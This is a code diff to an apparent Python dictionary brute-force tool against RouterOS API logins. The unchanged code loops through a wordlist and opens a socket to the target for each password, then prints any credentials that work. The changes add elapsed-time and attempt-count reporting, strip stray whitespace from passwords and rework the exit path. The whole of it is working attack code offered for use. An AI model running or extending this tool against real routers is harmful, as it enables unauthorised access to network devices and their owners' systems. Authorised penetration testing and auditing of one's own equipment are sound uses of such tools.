@@ -221,6 +221,12 @@ class ApiRos:
             ret += s.decode('UTF-8', 'replace')
         return ret
 
+def run(pwd_num):
+    run_time = "%.1f" % (time.time() - t)
+    status = "Elapsed Time: %s sec | Passwords Tried: %s" % (run_time, pwd_num)
+    bar = "_"*len(status)
+    print(bar)
+    print(status + "\n")
 
 def main():
     print(banner)
@@ -289,11 +295,10 @@ def main():
         if not buffer: break
         count += buffer.count('\n')
     dictFile.seek(0)
-    
-    # Passwords iteration & socket creation
+
     items = 1
     for password in dictFile.readlines():
-        password = password.strip('\n')
+        password = password.strip('\n\r ')
         s = None
         for res in socket.getaddrinfo(target, port, socket.AF_UNSPEC, socket.SOCK_STREAM):
             af, socktype, proto, canonname, sa = res
@@ -341,12 +346,15 @@ def main():
             print("[-] Trying " + str(items) + " of " + str(count) + " Paswords - Current: " + password)
 
         if login == "!done":
-           print("[+] Login successful!!! User: " + user + " Password: " + password)
-           sys.exit(0)
+            print("[+] Login successful!!! User: " + user + " Password: " + password)
+            run(items)
+            return
         items +=1
+    print("[*] ATTACK FINISHED! No suitable credentials were found. Try again with a different wordlist.")
+    run(count)
 
 
 if __name__ == '__main__':
+    t = time.time()
     main()
-    # If this point is reached, no successful login was commited
-    print("[*] ATTACK FINISHED! No suitable credentials were found. Try again with a different wordlist.")
+    sys.exit()
